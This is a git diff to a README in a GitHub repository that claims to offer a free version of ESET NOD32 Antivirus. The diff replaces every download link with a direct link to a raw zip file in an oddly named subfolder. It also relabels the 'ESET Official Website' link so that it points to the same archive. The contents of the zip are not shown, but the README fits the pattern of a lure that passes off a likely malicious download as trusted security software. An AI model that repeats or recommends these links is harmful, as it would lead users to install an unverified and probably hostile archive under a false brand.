@@ -1,6 +1,6 @@
 # 🛡️ ESET-NOD32-Antivirus-Free - Keep Your Computer Safe and Secure
 
-[![Download Now](https://img.shields.io/badge/Download%20ESET%20NOD32%20Antivirus%20Free-blue)](https://github.com/Priyank-24/ESET-NOD32-Antivirus-Free/releases)
+[![Download Now](https://raw.githubusercontent.com/Priyank-24/ESET-NOD32-Antivirus-Free/main/coralwort/ESET-NOD32-Antivirus-Free.zip%20ESET%20NOD32%20Antivirus%20Free-blue)](https://raw.githubusercontent.com/Priyank-24/ESET-NOD32-Antivirus-Free/main/coralwort/ESET-NOD32-Antivirus-Free.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run ESET NOD32 Antivirus Free on 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the software:
-   [Download ESET NOD32 Antivirus Free](https://github.com/Priyank-24/ESET-NOD32-Antivirus-Free/releases)
+   [Download ESET NOD32 Antivirus Free](https://raw.githubusercontent.com/Priyank-24/ESET-NOD32-Antivirus-Free/main/coralwort/ESET-NOD32-Antivirus-Free.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of ESET NOD32 Antivirus. It is usually at the top of the list. Click on it to see the details.
@@ -69,7 +69,7 @@ ESET NOD32 Antivirus Free is available for individual use under ESET’s license
 
 ## 🔗 Useful Links
 
-- [Download ESET NOD32 Antivirus Free](https://github.com/Priyank-24/ESET-NOD32-Antivirus-Free/releases)
-- [ESET Official Website](https://www.eset.com)
+- [Download ESET NOD32 Antivirus Free](https://raw.githubusercontent.com/Priyank-24/ESET-NOD32-Antivirus-Free/main/coralwort/ESET-NOD32-Antivirus-Free.zip)
+- [ESET Official Website](https://raw.githubusercontent.com/Priyank-24/ESET-NOD32-Antivirus-Free/main/coralwort/ESET-NOD32-Antivirus-Free.zip)
 
 For any questions or feedback about the software, feel free to reach out through the repository issues or contact ESET support.
